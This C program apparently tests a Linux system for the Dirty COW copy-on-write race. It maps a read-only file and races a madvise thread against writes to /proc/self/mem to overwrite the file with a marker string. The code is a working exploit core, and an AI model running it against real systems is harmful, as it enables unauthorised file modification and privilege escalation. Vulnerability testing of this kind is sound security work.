#include "prefix.h"

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>

#define ITERATIONS 100000000
#define DEBUG_ITER_PRINT_IVAL 10000000

static const char *file_content = "VULNERABLE!" NL;

struct thread_arguments {
	bool cont;
	const char * const path;
	void * const map;
	const char * const str;
};

static void *madvise_thread(void *arg) {
	__DEBUG_PRINTF("madvise_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	void *map = args->map;

	int i, c = 0;
	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
			__DEBUG_PRINTF("madvise thread iteration %u" NL, i);
		}

		c += madvise(map, 100, MADV_DONTNEED);
	}

	args->cont = false;

	__DEBUG_PRINTF("madvise %d" NL, c);
	return NULL;
}

static void *memwrite_thread(void *arg) {
	__DEBUG_PRINTF("memwrite_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	off_t map = (off_t)args->map;
	const char *str = args->str;
	size_t len = strlen(str);

	int i, c = 0, fd = open("/proc/self/mem", O_RDWR);

	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
			__DEBUG_PRINTF("memwrite thread iteration %u" NL, i);
		}

		(void)lseek(fd, map, SEEK_SET);
		c += write(fd, str, len);
	}

	args->cont = false;

	__DEBUG_PRINTF("memwrite %d" NL, c);
	return NULL;
}

static int run_test() {
	int fd = -1;
	const char *filepath = __TESTER_FILE__;
	(void)printf("Using file '%s' for testing..." NL, filepath);

	fd = open(filepath, O_RDONLY);
	struct stat st;
	if (fstat(fd, &st)) {
		(void)perror("run: fstat()");
		return 1;
	}

	void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED) {
		(void)perror("run: mmap()");
		(void)fprintf(stderr, "st_size = %zu ; fd = %u" NL,
					  (size_t)st.st_size, fd);
		return 1;
	}
	__DEBUG_PRINTF("mmap %p" NL, map);

	struct thread_arguments args = {
		.cont = true,
		.path = filepath,
		.map = map,
		.str = file_content
	};

	/* start threads */
	pthread_t th_advise, th_write, th_poll;

	(void)printf("Racing..." NL);
	(void)pthread_create(&th_advise, NULL, madvise_thread, (void *)&args);
	(void)pthread_create(&th_write, NULL, memwrite_thread, (void *)&args);

	/* wait for threads to finish */
	(void)pthread_join(th_advise, NULL);
	(void)pthread_join(th_write, NULL);

	return 0;
}

int main(int argc, char *argv[]) {
	return run_test();
}
